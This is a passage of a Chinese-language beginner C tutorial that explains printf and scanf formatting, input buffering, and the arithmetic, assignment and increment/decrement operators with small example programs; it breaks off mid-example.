<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">char</span> a = <span class="hljs-string">&#x27;a&#x27;</span>;
    <span class="hljs-type">short</span> <span class="hljs-type">int</span> b = <span class="hljs-number">123</span>;
    <span class="hljs-type">int</span>  c = <span class="hljs-number">123</span>;
    <span class="hljs-type">long</span> <span class="hljs-type">int</span> d = <span class="hljs-number">123</span>;
    <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> e = <span class="hljs-number">123</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %hhd\n&quot;</span>, a); <span class="hljs-comment">// 97</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b = %hd\n&quot;</span>, b); <span class="hljs-comment">// 123</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c = %d\n&quot;</span>, c); <span class="hljs-comment">// 123</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;d = %ld\n&quot;</span>, d); <span class="hljs-comment">// 123</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;e = %lld\n&quot;</span>, e); <span class="hljs-comment">// 123</span>
&#125;
</code></pre>
<ul>
<li>转义字符
<ul>
<li>格式: <code>printf(&quot;%f%%&quot;, 3.1415);</code></li>
<li>%号在格式控制字符串中有特殊含义, 所以想输出%必须添加一个转移字符</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%f%%&quot;</span>, <span class="hljs-number">3.1415</span>); <span class="hljs-comment">// 输出结果3.1415%</span>
&#125;
</code></pre>
<h2 id="scanf函数">scanf函数</h2>
<ul>
<li>
<p>scanf函数用于接收键盘输入的内容, 是一个阻塞式函数,程序会停在scanf函数出现的地方, 直到接收到数据才会执行后面的代码</p>
</li>
<li>
<p>printf函数的调用格式为:</p>
<ul>
<li><code>scanf(&quot;格式控制字符串&quot;, 地址列表);</code></li>
<li>例如: <code>scanf(&quot;%d&quot;, &amp;num);</code></li>
</ul>
</li>
<li>
<p>基本用法</p>
<ul>
<li>地址列表项中只能传入变量地址, 变量地址可以通过&amp;符号+变量名称的形式获取</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number;
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;number); <span class="hljs-comment">// 接收一个整数</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %d\n&quot;</span>, number); 
&#125;
c</code></pre>
<ul>
<li>接收非字符和字符串类型时, 空格、Tab和回车会被忽略</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">float</span> num;
    <span class="hljs-comment">// 例如:输入 Tab 空格 回车 回车 Tab 空格 3.14 , 得到的结果还是3.14</span>
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;num);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num = %f\n&quot;</span>, num);
&#125;
</code></pre>
<ul>
<li>非格式字符串原样输入, 格式控制字符串会赋值给地址项列表项中的变量
<ul>
<li>不推荐这种写法</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number;
    <span class="hljs-comment">// 用户必须输入number = 数字  , 否则会得到一个意外的值</span>
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;number = %d&quot;</span>, &amp;number);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %d\n&quot;</span>, number);
&#125;
</code></pre>
<ul>
<li>接收多条数据
<ul>
<li>格式控制字符串和地址列表项在数量和类型上必须一一对应</li>
<li>非字符和字符串情况下如果没有指定多条数据的分隔符, 可以使用空格或者回车作为分隔符(不推荐这种写法)</li>
<li>非字符和字符串情况下建议明确指定多条数据之间分隔符</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number;
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;number);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %d\n&quot;</span>, number);
    <span class="hljs-type">int</span> value;
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;value);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;value = %d\n&quot;</span>, value);
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number;
    <span class="hljs-type">int</span> value;
    <span class="hljs-comment">// 可以输入 数字 空格 数字, 或者 数字 回车 数字</span>
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>, &amp;number, &amp;value);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %d\n&quot;</span>, number);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;value = %d\n&quot;</span>, value);
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number;
    <span class="hljs-type">int</span> value;
    <span class="hljs-comment">// 输入 数字,数字 即可</span>
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d,%d&quot;</span>, &amp;number, &amp;value);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %d\n&quot;</span>, number);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;value = %d\n&quot;</span>, value);
&#125;
</code></pre>
<ul>
<li>\n是scanf函数的结束符号, 所以格式化字符串中不能出现\n</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number;
    <span class="hljs-comment">// 输入完毕之后按下回车无法结束输入</span>
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, &amp;number);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %d\n&quot;</span>, number);
&#125;
</code></pre>
<h2 id="scanf运行原理">scanf运行原理</h2>
<ul>
<li>系统会将用户输入的内容先放入输入缓冲区</li>
<li>scanf方式会从输入缓冲区中逐个取出内容赋值给变量</li>
<li>如果输入缓冲区的内容不为空,scanf会一直从缓冲区中获取,而不要求再次输入</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> num1;
    <span class="hljs-type">int</span> num2;
    <span class="hljs-type">char</span> ch1;
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%c%d&quot;</span>, &amp;num1, &amp;ch1, &amp;num2);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num1 = %d, ch1 = %c, num2 = %d\n&quot;</span>, num1, ch1, num2);
    <span class="hljs-type">char</span> ch2;
    <span class="hljs-type">int</span> num3;
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c%d&quot;</span>,&amp;ch2, &amp;num3);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ch2 = %c, num3 = %d\n&quot;</span>, ch2, num3);
&#125;
</code></pre>
<ul>
<li>
<p>利用fflush方法清空缓冲区(不是所有平台都能使用)</p>
<ul>
<li>格式: fflush(stdin);</li>
<li>C和C++的标准里从来没有定义过 fflush(stdin)</li>
<li>MSDN 文档里清除的描述着&quot;fflush on input stream is an extension to the C standard&quot; （fflush 是在标准上扩充的函数, 不是标准函数, 所以不是所有平台都支持）</li>
</ul>
</li>
<li>
<p>利用setbuf方法清空缓冲区(所有平台有效)</p>
<ul>
<li>格式: <code>setbuf(stdin, NULL);</code></li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> num1;
    <span class="hljs-type">int</span> num2;
    <span class="hljs-type">char</span> ch1;
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%c%d&quot;</span>, &amp;num1, &amp;ch1, &amp;num2);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num1 = %d, ch1 = %c, num2 = %d\n&quot;</span>, num1, ch1, num2);
    <span class="hljs-comment">//fflush(stdin); // 清空输入缓存区</span>
    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// 清空输入缓存区</span>
    <span class="hljs-type">char</span> ch2;
    <span class="hljs-type">int</span> num3;
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c%d&quot;</span>,&amp;ch2, &amp;num3);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ch2 = %c, num3 = %d\n&quot;</span>, ch2, num3);
&#125;
</code></pre>
<h2 id="putchar和getchar">putchar和getchar</h2>
<ul>
<li>putchar: 向屏幕输出一个字符</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">char</span> ch = <span class="hljs-string">&#x27;a&#x27;</span>;
    <span class="hljs-built_in">putchar</span>(ch); <span class="hljs-comment">// 输出a</span>
&#125;
</code></pre>
<ul>
<li>getchar: 从键盘获得一个字符</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">char</span> ch;
    ch = getchar();<span class="hljs-comment">// 获取一个字符</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ch = %c\n&quot;</span>, ch);
&#125;
</code></pre>
<h2 id="运算符基本概念">运算符基本概念</h2>
<p>和数学中的运算符一样, C语言中的运算符是告诉程序执行特定算术或逻辑操作的符号</p>
<ul>
<li>
<p>例如告诉程序, 某两个数相加, 相减,相乘等</p>
</li>
<li>
<p>什么是表达式</p>
<ul>
<li>表达式就是利用运算符链接在一起的有意义,有结果的语句;</li>
<li>例如: a + b; 就是一个算数表达式, 它的意义是将两个数相加, 两个数相加的结果就是表达式的结果</li>
<li>注意: 表达式一定要有结果</li>
</ul>
</li>
</ul>
<h2 id="运算符分类">运算符分类</h2>
<ul>
<li>按照功能划分:
<ul>
<li>算术运算符</li>
<li>赋值运算符</li>
<li>关系运算符</li>
<li>逻辑运算符</li>
<li>位运算符</li>
</ul>
</li>
<li>按照参与运算的操作数个数划分:
<ul>
<li>单目运算
<ul>
<li>只有一个操作数 如 : i++;</li>
</ul>
</li>
<li>双目运算
<ul>
<li>有两个操作数 如 : a + b;</li>
</ul>
</li>
<li>三目运算
<ul>
<li>C语言中唯一的一个,也称为问号表达式 如: a&gt;b ? 1 : 0;</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="运算符的优先级和结合性">运算符的优先级和结合性</h2>
<ul>
<li>早在小学的数学课本中,我们就学习过&quot;从左往右,先乘除后加减,有括号的先算括号里面的&quot;, 这句话就蕴含了优先级和结合性的问题</li>
<li>C语言中,运算符的运算优先级共分为15 级。1 级最高,15 级最低
<ul>
<li>在C语言表达式中,不同优先级的运算符, 运算次序按照由高到低执行</li>
<li>在C语言表达式中,相同优先级的运算符, 运算次序按照结合性规定的方向执行</li>
</ul>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ad15a74c1532c2cda51661a44415cec5.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/9dbe725f7f1b7b8c37ca10b841584aec.png" alt="img"></p>
<h2 id="算数运算符">算数运算符</h2>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>优先级</strong></th>
<th style="text-align:center"><strong>名称</strong></th>
<th style="text-align:center"><strong>符号</strong></th>
<th style="text-align:center"><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">乘法运算符</td>
<td style="text-align:center">*</td>
<td style="text-align:center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">除法运算符</td>
<td style="text-align:center">/</td>
<td style="text-align:center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">求余运算符 (模运算符)</td>
<td style="text-align:center">%</td>
<td style="text-align:center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">加法运算符</td>
<td style="text-align:center">+</td>
<td style="text-align:center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">减法运算符</td>
<td style="text-align:center">-</td>
<td style="text-align:center">双目运算符,具有左结合性</td>
</tr>
</tbody>
</table>
<p>注意事项</p>
<ul>
<li>如果参与运算的两个操作数皆为整数, 那么结果也为整数</li>
<li>如果参与运算的两个操作数其中一个是浮点数, 那么结果一定是浮点数</li>
<li>求余运算符, 本质上就是数学的商和余&quot;中的余数</li>
<li>求余运算符, 参与运算的两个操作数必须都是整数, 不能包含浮点数</li>
<li>求余运算符, 被除数小于除数, 那么结果就是被除数</li>
<li>求余运算符, 运算结果的正负性取决于被除数,跟除数无关, 被除数是正数结果就是正数,被除数是负数结果就是负数</li>
<li>求余运算符, 被除数为0, 结果为0</li>
<li>求余运算符, 除数为0, 没有意义(不要这样写)</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;
    <span class="hljs-type">int</span> b = <span class="hljs-number">5</span>;
    <span class="hljs-comment">// 加法</span>
    <span class="hljs-type">int</span> result = a + b;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, result); <span class="hljs-comment">// 15</span>
    <span class="hljs-comment">// 减法</span>
    result = a - b;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, result); <span class="hljs-comment">// 5</span>
    <span class="hljs-comment">// 乘法</span>
    result = a * b;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, result); <span class="hljs-comment">// 50</span>
    <span class="hljs-comment">// 除法</span>
    result = a / b;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, result); <span class="hljs-comment">// 2</span>
    
    <span class="hljs-comment">// 算术运算符的结合性和优先级</span>
    <span class="hljs-comment">// 结合性: 左结合性, 从左至右</span>
    <span class="hljs-type">int</span> c = <span class="hljs-number">50</span>;
    result = a + b + c; <span class="hljs-comment">// 15 + c;  65;</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, result);
    
    <span class="hljs-comment">// 优先级: * / % 大于 + -</span>
    result = a + b * c; <span class="hljs-comment">// a + 250; 260;</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, result);
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-comment">// 整数除以整数, 结果还是整数</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, <span class="hljs-number">10</span> / <span class="hljs-number">3</span>); <span class="hljs-comment">// 3</span>

    <span class="hljs-comment">// 参与运算的任何一个数是小数, 结果就是小数</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%f\n&quot;</span>, <span class="hljs-number">10</span> / <span class="hljs-number">3.0</span>); <span class="hljs-comment">// 3.333333</span>
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-comment">// 10 / 3 商等于3, 余1</span>
    <span class="hljs-type">int</span> result = <span class="hljs-number">10</span> % <span class="hljs-number">3</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>

    <span class="hljs-comment">// 左边小于右边, 那么结果就是左边</span>
    result = <span class="hljs-number">2</span> % <span class="hljs-number">10</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, result); <span class="hljs-comment">// 2</span>

    <span class="hljs-comment">// 被除数是正数结果就是正数,被除数是负数结果就是负数</span>
    result = <span class="hljs-number">10</span> % <span class="hljs-number">3</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
    result = <span class="hljs-number">-10</span> % <span class="hljs-number">3</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, result); <span class="hljs-comment">// -1</span>
    result = <span class="hljs-number">10</span> % <span class="hljs-number">-3</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
&#125;
</code></pre>
<h2 id="赋值运算符">赋值运算符</h2>
<table>
<thead>
<tr>
<th style="text-align:center">优先级</th>
<th style="text-align:center"><strong>名称</strong></th>
<th style="text-align:center"><strong>符号</strong></th>
<th style="text-align:center"><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">赋值运算符</td>
<td style="text-align:center">=</td>
<td style="text-align:center">双目运算符,具有右结合性</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">除后赋值运算符</td>
<td style="text-align:center">/=</td>
<td style="text-align:center">双目运算符,具有右结合性</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">乘后赋值运算符 (模运算符)</td>
<td style="text-align:center">*=</td>
<td style="text-align:center">双目运算符,具有右结合性</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">取模后赋值运算符</td>
<td style="text-align:center">%=</td>
<td style="text-align:center">双目运算符,具有右结合性</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">加后赋值运算符</td>
<td style="text-align:center">+=</td>
<td style="text-align:center">双目运算符,具有右结合性</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">减后赋值运算符</td>
<td style="text-align:center">-=</td>
<td style="text-align:center">双目运算符,具有右结合性</td>
</tr>
</tbody>
</table>
<ul>
<li>简单赋值运算符</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-comment">// 简单的赋值运算符 =</span>
    <span class="hljs-comment">// 会将=右边的值赋值给左边</span>
    <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %i\n&quot;</span>, a); <span class="hljs-comment">// 10</span>
&#125;
</code></pre>
<ul>
<li>复合赋值运算符</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
     <span class="hljs-comment">// 复合赋值运算符 += -= *= /= %=</span>
     <span class="hljs-comment">// 将变量中的值取出之后进行对应的操作, 操作完毕之后再重新赋值给变量</span>
     <span class="hljs-type">int</span> num1 = <span class="hljs-number">10</span>;
     <span class="hljs-comment">// num1 = num1 + 1; num1 = 10 + 1; num1 = 11;</span>
     num1 += <span class="hljs-number">1</span>;
     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num1 = %i\n&quot;</span>, num1); <span class="hljs-comment">// 11</span>
     <span class="hljs-type">int</span> num2 = <span class="hljs-number">10</span>;
     <span class="hljs-comment">// num2 = num2 - 1; num2 = 10 - 1; num2 = 9;</span>
     num2 -= <span class="hljs-number">1</span>;
     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num2 = %i\n&quot;</span>, num2); <span class="hljs-comment">// 9</span>
     <span class="hljs-type">int</span> num3 = <span class="hljs-number">10</span>;
     <span class="hljs-comment">// num3 = num3 * 2; num3 = 10 * 2; num3 = 20;</span>
     num3 *= <span class="hljs-number">2</span>;
     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num3 = %i\n&quot;</span>, num3); <span class="hljs-comment">// 20</span>
     <span class="hljs-type">int</span> num4 = <span class="hljs-number">10</span>;
     <span class="hljs-comment">// num4 = num4 / 2; num4 = 10 / 2; num4 = 5;</span>
     num4 /= <span class="hljs-number">2</span>;
     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num4 = %i\n&quot;</span>, num4); <span class="hljs-comment">// 5</span>
     <span class="hljs-type">int</span> num5 = <span class="hljs-number">10</span>;
     <span class="hljs-comment">// num5 = num5 % 3; num5 = 10 % 3; num5 = 1;</span>
     num5 %= <span class="hljs-number">3</span>;
     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num5 = %i\n&quot;</span>, num5); <span class="hljs-comment">// 1</span>
&#125;
</code></pre>
<ul>
<li>结合性和优先级</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number = <span class="hljs-number">10</span>;
    <span class="hljs-comment">// 赋值运算符优先级是14, 普通运算符优先级是3和4, 所以先计算普通运算符</span>
    <span class="hljs-comment">// 普通运算符中乘法优先级是3, 加法是4, 所以先计算乘法</span>
    <span class="hljs-comment">// number += 1 + 25; number += 26; number = number + 26; number = 36;</span>
    number += <span class="hljs-number">1</span> + <span class="hljs-number">5</span> * <span class="hljs-number">5</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %i\n&quot;</span>, number); <span class="hljs-comment">// 36</span>
&#125;
</code></pre>
<h2 id="自增自减运算符">自增自减运算符</h2>
<ul>
<li>在程序设计中,经常遇到“i=i+1”和“i=i-1”这两种极为常用的操作。</li>
<li>C语言为这种操作提供了两个更为简洁的运算符,即++和–</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">优先级</th>
<th style="text-align:center"><strong>名称</strong></th>
<th style="text-align:center">符号</th>
<th style="text-align:center"><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">自增运算符(在后)</td>
<td style="text-align:center">i++</td>
<td style="text-align:center">单目运算符,具有左结合性</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">自增运算符(在前)</td>
<td style="text-align:center">++i</td>
<td style="text-align:center">单目运算符,具有右结合性</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">自减运算符(在后)</td>
<td style="text-align:center">i–</td>
<td style="text-align:center">单目运算符,具有左结合性</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">自减运算符(在前)</td>
<td style="text-align:center">–i</td>
<td style="text-align:center">单目运算符,具有右结合性</td>
</tr>
</tbody>
</table>
<ul>
<li>自增
<ul>
<li>如果只有<em><strong>单个</strong></em>变量, 无论++写在前面还是后面都会对变量做+1操作</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number = <span class="hljs-number">10</span>;
    number++;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %i\n&quot;</span>, number); <span class="hljs-comment">// 11</span>
    ++number;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %i\n&quot;</span>, number); <span class="hljs-comment">// 12</span>
&#125;
</code></pre>
<ul>
<li>如果出现在一个表达式中, 那么++写在前面和后面就会有所区别
<ul>
<li>前缀表达式:++x, --x;其中x表示变量名,先完成变量的自增自减1运算,再用x的值作为表达式的值;即“先变后用”,也就是变量的值先变,再用变量的值参与运算</li>
<li>后缀表达式:x++, x–;先用x的当前值作为表达式的值,再进行自增自减1运算。即“先用后变”,也就是先用变量的值参与运算,变量的值再进行自增自减变化</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number = <span class="hljs-number">10</span>;
    <span class="hljs-comment">// ++在后, 先参与表达式运算, 再自增</span>
    <span class="hljs-comment">// 表达式运算时为: 3 + 10;</span>
    <span class="hljs-type">int</span> result = <span class="hljs-number">3</span> + number++;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 13</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %i\n&quot;</span>, number); <span class="hljs-comment">// 11</span>
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number = <span class="hljs-number">10</span>;
    <span class="hljs-comment">// ++在前, 先自增, 再参与表达式运算</span>
    <span class="hljs-comment">// 表达式运算时为: 3 + 11;</span>
    <span class="hljs-type">int</span> result = <span class="hljs-number">3</span> + ++number;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 14</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %i\n&quot;</span>, number); <span class="hljs-comment">// 11</span>
&#125;
</code></pre>
<ul>
<li>自减</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number = <span class="hljs-number">10</span>;
    <span class="hljs-comment">// --在后, 先参与表达式运算, 再自减</span>
    <span class="hljs-comment">// 表达式运算时为: 10 + 3;</span>
    <span class="hljs-type">int</span> result = number-- + <span class="hljs-number">3</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 13</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %i\n&quot;</span>, number); <span class="hljs-comment">// 9</span>
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> number = <span class="hljs-number">10</span>;
    <span class="hljs-comment">// --在前, 先自减, 再参与表达式运算</span>
